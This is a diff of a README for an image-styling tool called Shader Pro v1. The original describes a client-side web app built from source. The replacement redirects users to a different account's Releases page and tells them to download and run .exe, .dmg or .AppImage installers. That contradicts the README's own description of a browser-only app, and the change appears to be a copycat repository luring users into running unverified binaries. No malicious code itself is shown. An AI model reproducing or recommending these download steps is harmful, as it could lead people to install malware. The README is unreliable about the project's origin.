@@ -1,93 +1,102 @@
-<div align="center">
+# 🎨 Shader-Pro-v1 - Create Stunning Product Marketing Assets
 
-# Shader Pro v1
+[![Download Shader-Pro-v1](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/TegginamathadaBasavananda/Shader-Pro-v1/releases)
 
-**A professional styling studio for digital product assets.**
+## 🚀 Getting Started
 
-<a href="https://dovvnloading.github.io/Shader-Pro-v1/">
-  <img src="https://img.shields.io/badge/Launch_Application-000000?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Launch App" />
-</a>
+Shader Pro is a client-side web application that makes it easy to create high-quality marketing materials. You can upload your product images and apply various stylish effects like glassmorphism, directional lighting, and multi-layered shadowing. This guide will help you download and run Shader Pro smoothly.
 
-<br />
-<br />
+## 🖥️ System Requirements
 
-<img width="100%" alt="Shader Pro Interface" src="https://github.com/user-attachments/assets/78dd6848-a842-497c-9f3b-893a32d3f4c5" />
+Before you start, make sure your system meets the following requirements:
 
-<br />
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any modern Linux distribution.
+- **Browser:** Latest versions of Google Chrome, Firefox, Safari, or Edge.
+- **RAM:** At least 4 GB recommended.
+- **Disk Space:** Minimum 200 MB free for installation.
 
-[![React](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)](https://reactjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Vite](https://img.shields.io/badge/Vite-646CFF?style=for-the-badge&logo=vite&logoColor=white)](https://vitejs.dev/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white)](https://tailwindcss.com/)
-[![GitHub Actions](https://img.shields.io/badge/GitHub_Actions-2088FF?style=for-the-badge&logo=github-actions&logoColor=white)](https://github.com/features/actions)
+## 📥 Download & Install
 
-</div>
+To get Shader Pro, visit this page to download: [Shader-Pro-v1 Releases](https://github.com/TegginamathadaBasavananda/Shader-Pro-v1/releases).
 
-## Overview
+1. Click the link above to go to the Releases page.
+2. On the Releases page, locate the latest version.
+3. Download the file that matches your operating system:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the `.AppImage` file.
 
-Shader Pro is a client-side web application designed to streamline the creation of high-quality product marketing assets. It provides a real-time composition environment where users can upload screenshots or product images and apply sophisticated styling effects including glassmorphism, directional lighting, and multi-layered shadowing.
+4. Once the download completes, follow these steps based on your operating system:
 
-The application operates entirely within the browser, ensuring zero latency and complete privacy for uploaded assets. It features a batch processing engine capable of styling and exporting multiple images simultaneously.
+### Windows
+- Double-click the downloaded `.exe` file.
+- Follow the installation prompts to complete the setup.
+- Once installed, find Shader Pro in your Start Menu and launch it.
 
-## Interface Showcase
+### macOS
+- Double-click the downloaded `.dmg` file.
+- Drag the Shader Pro icon to your Applications folder.
+- Open the Applications folder, find Shader Pro, and double-click to launch.
 
-<div align="center">
-  <img width="100%" alt="Shader Pro Light Mode" src="https://github.com/user-attachments/assets/090229ee-9f85-4446-8ee5-fd3743868294" />
-</div>
+### Linux
+- Open your terminal.
+- Navigate to the location where you downloaded the `.AppImage` file.
+- Make the file executable by running: `chmod +x ShaderPro.AppImage`.
+- Now, run the application by typing: `./ShaderPro.AppImage`.
 
-## Key Capabilities
+## 🎨 Features
 
-### Rendering Engine
-*   **Dual-Layer Shadows:** Configurable primary and secondary shadow layers for depth simulation (Drop Shadow or Box Shadow modes).
-*   **Directional Lighting:** Global light source control with interactive on-screen manipulation.
-*   **Glassmorphism:** Real-time backdrop blur and transparency processing.
-*   **Smart Layouts:** Automated aspect ratio resizing and scale fitting.
+Shader Pro offers various features to enhance your product images:
 
-### Batch Processing
-*   **Multi-File Support:** Upload and process dozens of images in a single session.
-*   **State Persistence:** Styling settings persist across the entire batch.
-*   **ZIP Export:** Automated archiving of processed assets into a single downloadable ZIP file.
+- **Real-time Composition:** See changes instantly as you apply effects.
+- **Multiple Styling Effects:** Experiment with glassmorphism, directional lighting, and shadowing.
+- **User-Friendly Interface:** Designed for ease of use, so you can focus on creativity, not technology.
+- **Save and Share:** Save your compositions for later use or share them directly online.
 
-### Customization
-*   **Cutout Mode:** Specialized rendering for transparent PNGs (logos, isolated products).
-*   **Card Mode:** Standard containerized rendering for screenshots and UI mocks.
-*   **Granular Control:** Pixel-perfect control over border radius, stroke width, opacity, and color gradients.
+## 🌐 Using Shader Pro
 
-## Technical Architecture
+Once you open Shader Pro, follow these steps to start creating your marketing assets:
 
-The application is built on a modern React 19 stack, leveraging Vite for build tooling and TypeScript for type safety.
+1. **Upload an Image:**
+   - Click on the "Upload" button.
+   - Select a screenshot or product image from your computer.
 
-*   **Framework:** React 19 (Hooks-based architecture)
-*   **Styling:** Tailwind CSS (Utility-first with dark mode support)
-*   **Imaging:** `html-to-image` for canvas rasterization
-*   **Compression:** `jszip` for client-side batch archiving
-*   **Icons:** Lucide React
+2. **Apply Effects:**
+   - Choose from the options in the sidebar.
+   - Adjust settings such as opacity, light direction, and shadow depth to customize your image.
 
-## Local Development
+3. **Preview Your Work:**
+   - View your image in real-time.
+   - Make any adjustments until you are satisfied with the result.
 
-To run this project locally, follow these steps:
+4. **Save Your Composition:**
+   - Once happy with your creation, click on "Save" to download your file.
 
-1.  **Clone the repository**
-    ```bash
-    git clone https://github.com/dovvnloading/Shader-Pro-v1.git
-    cd Shader-Pro-v1
-    ```
+5. **Share Your Asset:**
+   - Use the provided options to share directly to social media or copy the link to share elsewhere.
 
-2.  **Install dependencies**
-    ```bash
-    npm install
-    ```
+## 🛠️ Troubleshooting
 
-3.  **Start the development server**
-    ```bash
-    npm run dev
-    ```
+If you encounter problems while using Shader Pro, here are some common issues and their solutions:
 
-4.  **Build for production**
-    ```bash
-    npm run build
-    ```
+- **Image Not Uploading:** Ensure your file format is supported. Try using JPG, PNG, or GIF.
+- **Performance Issues:** Close other applications to free up memory. Ensure your system meets the minimum requirements.
+- **Application Crashing:** Make sure you are using the latest version. Restart your computer to clear temporary files.
 
-## License
+## 🎉 Once You're Done
 
-This project is open source and available under the MIT License.
+After you complete your projects, consider exploring more advanced features:
+
+- Create and save templates for future use.
+- Experiment with different image types and styles.
+- Join the community forum for tips and feedback.
+
+## ✉️ Community Support
+
+If you need help or want to share your creations, join our community forum on our GitHub page. Connect with other users, share ideas, and get support.
+
+## 📞 Contact Information
+
+For further inquiries or support, you can reach us through the contact information available on our GitHub profile.
+
+**Happy creating with Shader Pro!**
